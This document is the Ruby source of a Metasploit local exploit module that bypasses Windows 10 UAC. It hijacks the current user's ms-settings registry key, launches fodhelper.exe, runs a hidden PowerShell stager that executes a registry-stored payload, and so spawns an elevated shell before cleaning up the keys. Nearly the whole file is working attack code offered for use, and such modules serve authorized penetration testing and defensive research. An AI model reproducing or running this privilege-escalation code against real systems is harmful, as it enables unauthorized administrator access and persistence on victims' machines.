##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/exe'
require 'msf/core/exploit/powershell'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Exploit::Powershell
  include Post::File
  include Post::Windows::Priv
  include Post::Windows::Registry
  include Post::Windows::Runas

  FODHELPER_DEL_KEY   = "HKCU\\Software\\Classes\\ms-settings"
  FODHELPER_WRITE_KEY = "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command"

  DELE_REG_VAL         = 'DelegateExecute'
  DELE_REG_VAL_TYPE    = 'REG_SZ'

  EXEC_REG_VAL        = '' # This maps to "(Default)"
  EXEC_REG_VAL_TYPE   = 'REG_SZ'

  FODHELPER_PATH      = "%WINDIR%\\System32\\fodhelper.exe"
  PSH_PATH            = "%WINDIR%\\System32\\WindowsPowershell\\v1.0\\powershell.exe"
  CMD_MAX_LEN         = 2081

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows Escalate UAC Protection Bypass (Via FodHelper Registry Key)',
      'Description'   => %q{
        This module will bypass Windows UAC in Windows 10 by hijacking a special key in the
        Registry under the current user hive, and inserting a custom command that will get
        invoked when the Windows FodHelper is launched. It will spawn a second shell that has
        the UAC flag turned off. This module modifies a registry key, but cleans up the key once
        the payload has been invoked. The module requires the architecture of the payload to
        match the OS. If specifying EXE::Custom your DLL should call ExitProcess() after starting your
        payload in a separate process.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [
          'Christian B. "winscripting"',                      # UAC bypass discovery and research
          'Josh Hale "sn0wfa11" <jhale85446[at]gmail.com>',   # MSF Module
          'OJ Reeves'                                         # bypassuac_eventvwr MSF module used as a template
        ],
      'Platform'      => ['win'],
      'SessionTypes'  => ['meterpreter'],
      'Targets'       => [[ 'Windows', {} ]],
      'DefaultTarget' => 0,
      'References'    => [
        [
          'URL', 'https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/',
          'URL', 'https://github.com/winscripting/UAC-bypass'
        ]
      ],
      'DisclosureDate'=> 'May 12 2017'
    ))
  end

  def check
    if sysinfo['OS'] =~ /Windows/ && is_uac_enabled? && exist?(FODHELPER_PATH)
      Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    registry_view = REGISTRY_VIEW_NATIVE

    if sysinfo['Architecture'] == ARCH_X64
      # On x64, check arch
      if session.arch == ARCH_X86
        # running WOW64, map the correct registry view
        registry_view = REGISTRY_VIEW_64_BIT
      end

      unless payload_instance.arch.first =~ /64/i
        fail_with(Failure::BadConfig, "x86 Payload Selected for x64 System")
      end
    else
      if payload_instance.arch.first =~ /64/i
        fail_with(Failure::BadConfig, 'x64 Payload Selected for x86 System')
      end
    end

    # Validate that we can actually do things before we bother
    # doing any more work
    check_permissions!

    case get_uac_level
      when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP,
        UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP,
        UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT
        fail_with(Failure::NotVulnerable,
                  "UAC is set to 'Always Notify'. This module does not bypass this setting, exiting..."
        )
      when UAC_DEFAULT
        print_good('UAC is set to Default')
        print_good('BypassUAC can bypass this setting, continuing...')
      when UAC_NO_PROMPT
        print_warning('UAC set to DoNotPrompt - using ShellExecute "runas" method instead')
        shell_execute_exe
        return
    end

    payload_value = rand_text_alpha(8)
    psh_path = expand_path("#{PSH_PATH}")

    template_path = Rex::Powershell::Templates::TEMPLATE_DIR
    psh_payload = Rex::Powershell::Payload.to_win32pe_psh_net(template_path, payload.encoded)

    psh_stager = "\"IEX (Get-ItemProperty -Path #{FODHELPER_WRITE_KEY.gsub('HKCU', 'HKCU:')} -Name #{payload_value}).#{payload_value}\""
    cmd = "#{psh_path} -nop -w hidden -c #{psh_stager}"

    existing = registry_getvaldata(FODHELPER_WRITE_KEY, EXEC_REG_VAL, registry_view) || ""

    if existing.empty?
      registry_createkey(FODHELPER_WRITE_KEY, registry_view)
    end

    print_status("Configuring payload and stager registry keys ...")
    registry_setvaldata(FODHELPER_WRITE_KEY, DELE_REG_VAL, "", DELE_REG_VAL_TYPE, registry_view)

    registry_setvaldata(FODHELPER_WRITE_KEY, EXEC_REG_VAL, cmd, EXEC_REG_VAL_TYPE, registry_view)
    registry_setvaldata(FODHELPER_WRITE_KEY, payload_value, psh_payload, EXEC_REG_VAL_TYPE, registry_view)

    # We can't invoke EventVwr.exe directly because CreateProcess fails with the
    # dreaded 740 error (Program requires elevation). Instead, we must invoke
    # cmd and use that to fire off the binary.

    cmd_path = expand_path('%COMSPEC%')
    cmd_args = expand_path("/c #{FODHELPER_PATH}")

    print_status("Executing payload: #{cmd_path} #{cmd_args}")

    # We can't use cmd_exec here because it blocks, waiting for a result.
    client.sys.process.execute(cmd_path, cmd_args, {'Hidden' => true})

    # Wait a copule of seconds to give the payload a chance to fire before cleaning up
    # TODO: fix this up to use something smarter than a timeout?
    Rex::sleep(5)

    handler(client)

    print_status("Cleaining up registry keys ...")
    if existing.empty?
      registry_deletekey(FODHELPER_DEL_KEY, registry_view)
    else
      registry_setvaldata(FODHELPER_WRITE_KEY, EXEC_REG_VAL, existing, EXEC_REG_VAL_TYPE, registry_view)
      registry_deleteval(FODHELPER_WRITE_KEY, payload_value, registry_view)
    end
  end

  def check_permissions!
    fail_with(Failure::None, 'Already in elevated state') if is_admin? || is_system?

    # Check if you are an admin
    vprint_status('Checking admin status...')
    admin_group = is_in_admin_group?

    unless check == Exploit::CheckCode::Appears
      fail_with(Failure::NotVulnerable, "Target is not vulnerable.")
    end

    unless is_in_admin_group?
      fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')
    end

    print_status('UAC is Enabled, checking level...')
    if admin_group.nil?
      print_error('Either whoami is not there or failed to execute')
      print_error('Continuing under assumption you already checked...')
    else
      if admin_group
        print_good('Part of Administrators group! Continuing...')
      else
        fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')
      end
    end

    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]
      fail_with(Failure::NoAccess, 'Cannot BypassUAC from Low Integrity Level')
    end
  end
end
